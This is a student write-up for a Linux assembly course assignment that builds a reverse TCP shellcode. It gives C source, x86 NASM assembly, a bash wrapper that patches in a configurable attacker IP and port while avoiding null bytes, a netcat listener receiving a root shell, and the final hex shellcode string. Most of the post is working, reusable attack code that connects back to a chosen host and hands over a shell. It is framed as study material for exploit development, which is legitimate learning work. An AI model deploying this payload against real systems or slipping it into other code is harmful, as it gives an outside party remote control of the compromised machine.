I"֖<p><br />
Student <strong>SLAE - 891</strong><br />
Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<p>Hello everybody,</p>

<p>So here we are for the second part of our shellcodes serie. Today we will deal with a reverse TCP shellcode.<br />
This shellcode will be pretty similar to the bind one, except that we will connect back to the attacker’s machine in order to provide a shell on the compromised one.<br />
<!--more--></p>

<p>So let’s see what changed.</p>

<h3 id="assignment-2">Assignment 2:</h3>

<p>Code is available on my <a href="https://github.com/phackt/slae/tree/master/assignment2">github repo</a>.</p>

<p><strong>Our Goal:</strong></p>
<blockquote>
  <p><em>Create a Shell_Reverse_TCP shellcode:</em></p>
  <ul>
    <li><em>reverse connects to IP and PORT and spawns a shell</em></li>
    <li><em>easily configurable IP and PORT</em></li>
  </ul>
</blockquote>

<p>Here is the C source code we used:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
</span> 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
 
        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span> <span class="c1">//8080</span>
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span> <span class="c1">//localhost</span>
 
        <span class="c1">// connecting to attacker's machine</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"Attacker's machine is not listening. Quitting!"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
 
        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Let’s listen on port 8080:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat <span class="nt">-klvp</span> 8080
Ncat: Version 7.40 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
</code></pre></div></div>

<p>Let’s connect:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o shell_reverse_tcp shell_reverse_tcp.c &amp;&amp; ./shell_reverse_tcp</span>

</code></pre></div></div>

<p>And we have:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat <span class="nt">-klvp</span> 8080
Ncat: Version 7.40 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:38488.
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>So what are the interesting functions:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> ./shell_reverse_tcp <span class="nt">-M</span> intel
...
80485d2: e8 79 fe ff ff call 8048450 &lt;connect@plt&gt;
...
</code></pre></div></div>

<p>So we have:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socket
connect
dup2
execve
</code></pre></div></div>

<p>Let’s update our previous shellcode to match our new needs:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; shell_bind_tcp.nasm</span>
<span class="c1">; </span>
<span class="c1">; A TCP port bind shellcode</span>
<span class="c1">;</span>
<span class="c1">; Author: SLAE - 891</span>
<span class="c1">;</span>
<span class="c1">; You are free to use and/or redistribute it without restriction</span>

<span class="nf">global</span>  <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>

<span class="c1">; sockfd = socket(AF_INET, SOCK_STREAM, 0);</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_SOCKET        1</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
    <span class="nf">mul</span> <span class="nb">ebx</span>         <span class="c1">; zero out eax and edx</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>     <span class="c1">; __NR_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>       <span class="c1">; SYS_SOCKET</span>
    
    <span class="c1">; we are pushing on the stack our arguments</span>
    <span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; IPPROTO_IP</span>
    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">1</span>     <span class="c1">; SOCK_STREAM</span>
    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">2</span>     <span class="c1">; AF_INET</span>
    
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; the top of the stack points to a structure of 3 arguments</span>
    <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; syscall - result is stored in eax</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; stores sockfd</span>

<span class="c1">; ret = connect(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(struct sockaddr_in));</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_CONNECT       3</span>
    
    <span class="nf">push</span> <span class="nb">edx</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="mh">0x7f</span>    <span class="c1">; mysockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //localhost</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">3</span><span class="p">],</span> <span class="mh">0x01</span>  <span class="c1">; useful to avoid null bytes in the IP address</span>

    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x901f</span>  <span class="c1">; mysockaddr.sin_port = htons(dstport); //8080</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mi">2</span>     <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; stores the address of mysockaddr</span>
    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">16</span>    <span class="c1">; length of mysockaddr</span>
    <span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">; pointer to mysockaddr</span>
    <span class="nf">push</span> <span class="nb">edi</span>        <span class="c1">; sockfd</span>

    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">; flushing registers</span>
    <span class="nf">mul</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>     <span class="c1">; __NR_socketcall</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">3</span>       <span class="c1">; SYS_CONNECT</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; pointer to the args for socketcall</span>
    <span class="nf">int</span> <span class="mh">0x80</span>



<span class="c1">; int dup2(int oldfd, int newfd); duplicates a file descriptor</span>
<span class="c1">; dup2(sockfd, 0); </span>
<span class="c1">; dup2(sockfd, 1);</span>
<span class="c1">; dup2(sockfd, 2);</span>
<span class="c1">; #define __NR_dup2 63</span>

    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>    <span class="c1">; sockfd as first argument</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">2</span>       <span class="c1">; 2 for stderr / 1 for stdout / 0 for stdin</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>

<span class="nl">dup2:</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">63</span>      <span class="c1">; __NR_dup2</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>
    <span class="nf">jns</span> <span class="nv">dup2</span>        <span class="c1">; jump short if not signed </span>

<span class="c1">; execve("/bin/sh", NULL, NULL);</span>
<span class="c1">; #define __NR_execve 11</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="mh">0x68732f2f</span> <span class="c1">; hs// - take care to the little endian representation</span>
    <span class="nf">push</span> <span class="mh">0x6e69622f</span> <span class="c1">; nib/</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; pointer to command string</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>      <span class="c1">; __NR_execve</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p>Let’s compile, run and see if we are receiving our connection back:<br />
<img src="http://localhost:4000/public/images/slae/assignment2/image1.png" alt="image1" /></p>

<p>Perfect, and what about the bad characters:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> ./shell_reverse_tcp <span class="nt">-M</span> intel| <span class="nb">grep </span>00
</code></pre></div></div>

<p>Nothing, good. Let’s update our <a href="https://github.com/phackt/slae/blob/master/assignment2/wrapper.sh">wrapper.sh</a> script and create our <a href="https://github.com/phackt/slae/blob/master/assignment2/shell_reverse_tcp.template">shell_reverse_tcp.template</a> file. Please click and check the sources on Github.</p>

<p>The wrapper.sh and the template file have been enhanced in order to avoid null bytes in port number and IP address:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /bin/bash</span>

<span class="c">#####################################</span>
<span class="c"># Displays help</span>
<span class="c">#####################################</span>
<span class="k">function </span><span class="nb">help</span><span class="o">(){</span>
    <span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;ip&gt; &lt;port_number&gt; &lt;file&gt;"</span>
    <span class="nb">exit </span>1
<span class="o">}</span>

<span class="c">#####################################</span>
<span class="c"># Checking is root</span>
<span class="c">#####################################</span>

<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">help
</span><span class="k">fi

</span><span class="nv">IP</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">PORT</span><span class="o">=</span><span class="nv">$2</span>
<span class="nv">FILE</span><span class="o">=</span><span class="nv">$3</span>

<span class="c">##############################</span>
<span class="c"># Checking the port number</span>
<span class="c">##############################</span>

<span class="k">if</span> <span class="o">[</span> <span class="k">${</span><span class="nv">PORT</span><span class="k">}</span> <span class="nt">-lt</span> 1 <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="k">${</span><span class="nv">PORT</span><span class="k">}</span> <span class="nt">-gt</span> 65535 <span class="o">]</span><span class="p">;</span> <span class="k">then
	</span><span class="nb">echo</span> <span class="s2">"[*] Port number should be between 1 and 65535! Exiting..."</span>
	<span class="nb">exit
</span><span class="k">fi</span>

<span class="c"># Converting port in hex and little endian representation</span>
<span class="nv">HEXFMTPORT</span><span class="o">=</span><span class="sb">`</span><span class="nb">printf</span> <span class="s2">"%04x"</span> <span class="k">${</span><span class="nv">PORT</span><span class="k">}</span><span class="sb">`</span>
<span class="nv">HEXFMTPORT1</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">$((</span><span class="m">16</span><span class="c">#${HEXFMTPORT:0:2})) -ne 0 ] &amp;&amp; echo 0x${HEXFMTPORT:0:2} || echo dl)</span>
<span class="nv">HEXFMTPORT2</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">$((</span><span class="m">16</span><span class="c">#${HEXFMTPORT: -2})) -ne 0 ] &amp;&amp; echo 0x${HEXFMTPORT: -2}	 || echo dl)</span>

<span class="c"># final nasm filename</span>
<span class="nv">NASM_FILENAME</span><span class="o">=</span><span class="k">${</span><span class="nv">FILE</span><span class="p">%.*</span><span class="k">}</span>.nasm

<span class="c">########################</span>
<span class="c"># Splitting IP address</span>
<span class="c">########################</span>
<span class="nv">IP1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IP</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="nb">.</span> <span class="nt">-f1</span><span class="sb">`</span>
<span class="nv">IP2</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IP</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="nb">.</span> <span class="nt">-f2</span><span class="sb">`</span>
<span class="nv">IP3</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IP</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="nb">.</span> <span class="nt">-f3</span><span class="sb">`</span>
<span class="nv">IP4</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IP</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="nb">.</span> <span class="nt">-f4</span><span class="sb">`</span>

<span class="c"># Converting IP in hex and little endian representation</span>
<span class="nv">HEXFMTIP1</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">${</span><span class="nv">IP1</span><span class="k">}</span> <span class="nt">-ne</span> 0 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"0x%x"</span> <span class="k">${</span><span class="nv">IP1</span><span class="k">}</span><span class="sb">`</span> <span class="o">||</span> <span class="nb">echo </span>dl<span class="si">)</span>
<span class="nv">HEXFMTIP2</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">${</span><span class="nv">IP2</span><span class="k">}</span> <span class="nt">-ne</span> 0 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"0x%x"</span> <span class="k">${</span><span class="nv">IP2</span><span class="k">}</span><span class="sb">`</span> <span class="o">||</span> <span class="nb">echo </span>dl<span class="si">)</span>
<span class="nv">HEXFMTIP3</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">${</span><span class="nv">IP3</span><span class="k">}</span> <span class="nt">-ne</span> 0 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"0x%x"</span> <span class="k">${</span><span class="nv">IP3</span><span class="k">}</span><span class="sb">`</span> <span class="o">||</span> <span class="nb">echo </span>dl<span class="si">)</span>
<span class="nv">HEXFMTIP4</span><span class="o">=</span><span class="si">$(</span><span class="o">[</span> <span class="k">${</span><span class="nv">IP4</span><span class="k">}</span> <span class="nt">-ne</span> 0 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"0x%x"</span> <span class="k">${</span><span class="nv">IP4</span><span class="k">}</span><span class="sb">`</span> <span class="o">||</span> <span class="nb">echo </span>dl<span class="si">)</span>

<span class="c"># for debugging purpose</span>
<span class="nb">echo</span> <span class="s2">"----------------------------"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTPORT:</span><span class="k">${</span><span class="nv">HEXFMTPORT</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTPORT1:</span><span class="k">${</span><span class="nv">HEXFMTPORT1</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTPORT2:</span><span class="k">${</span><span class="nv">HEXFMTPORT2</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTIP1:</span><span class="k">${</span><span class="nv">HEXFMTIP1</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTIP2:</span><span class="k">${</span><span class="nv">HEXFMTIP2</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTIP3:</span><span class="k">${</span><span class="nv">HEXFMTIP3</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"[*] HEXFMTIP4:</span><span class="k">${</span><span class="nv">HEXFMTIP4</span><span class="k">}</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"----------------------------"</span>
<span class="nb">echo</span>

<span class="c"># Replacing port and ip patterns</span>
<span class="c"># Generating a new file source and compiling</span>
<span class="nb">sed</span> <span class="s2">"s/PORT1/</span><span class="k">${</span><span class="nv">HEXFMTPORT1</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">FILE</span><span class="k">}</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sed</span> <span class="o">-</span>i <span class="s2">"s/PORT2/</span><span class="k">${</span><span class="nv">HEXFMTPORT2</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sed</span> <span class="o">-</span>i <span class="s2">"s/IP1/</span><span class="k">${</span><span class="nv">HEXFMTIP1</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sed</span> <span class="o">-</span>i <span class="s2">"s/IP2/</span><span class="k">${</span><span class="nv">HEXFMTIP2</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sed</span> <span class="o">-</span>i <span class="s2">"s/IP3/</span><span class="k">${</span><span class="nv">HEXFMTIP3</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
<span class="nb">sed</span> <span class="o">-</span>i <span class="s2">"s/IP4/</span><span class="k">${</span><span class="nv">HEXFMTIP4</span><span class="k">}</span><span class="s2">/"</span> <span class="k">${</span><span class="nv">NASM_FILENAME</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
./compile.sh <span class="k">${</span><span class="nv">FILE</span><span class="p">%.*</span><span class="k">}</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
objdump <span class="o">-</span>d <span class="k">${</span><span class="nv">FILE</span><span class="p">%.*</span><span class="k">}</span><span class="o">|</span><span class="nb">grep</span> <span class="s1">'[0-9a-f]:'</span><span class="o">|</span><span class="nb">grep</span> <span class="o">-</span>v <span class="s1">'file'</span><span class="o">|</span><span class="nb">cut</span> <span class="o">-</span>f2 <span class="o">-</span>d:|cut <span class="o">-</span>f1-6 <span class="o">-</span>d<span class="s1">' '</span><span class="o">|</span><span class="nb">tr</span> <span class="o">-</span>s <span class="s1">' '</span><span class="o">|</span><span class="nb">tr</span> <span class="s1">'\t'</span> <span class="s1">' '</span><span class="o">|</span><span class="nb">sed</span> <span class="s1">'s/ $//g'</span><span class="o">|</span><span class="nb">sed</span> <span class="s1">'s/ /\\x/g'</span><span class="o">|</span><span class="nb">paste</span> <span class="o">-</span>d <span class="s1">''</span> <span class="o">-</span>s <span class="o">|</span><span class="nb">sed</span> <span class="s1">'s/^/"/'</span><span class="o">|</span><span class="nb">sed</span> <span class="s1">'s/$/"/g'</span>
</code></pre></div></div>

<p>Trying with a port (2048 = 0x0800) and IP (127.0.0.1) which are generating some null bytes provides the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./wrapper.sh 127.0.0.1 2048 ./shell_reverse_tcp.template 
<span class="nt">----------------------------</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTPORT:0800
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTPORT1:0x08
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTPORT2:dl
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTIP1:0x7f
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTIP2:dl
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTIP3:dl
<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEXFMTIP4:0x1
<span class="nt">----------------------------</span>

<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<p>Here is the interesting part in our template:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">...</span>
    <span class="nf">push</span> <span class="nb">edx</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nv">IP1</span>    <span class="c1">; useful to avoid null bytes with parametrized IP</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nv">IP2</span>  <span class="c1">; If 00 will be replaced by dl</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="nv">IP3</span>     
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">3</span><span class="p">],</span> <span class="nv">IP4</span>

    <span class="nf">push</span> <span class="nb">dx</span>                  <span class="c1">; useful to avoid null bytes with parametrized port</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nv">PORT1</span>    <span class="c1">; mysockaddr.sin_port = htons(dstport); //8080</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nv">PORT2</span> 
<span class="nf">...</span>
</code></pre></div></div>

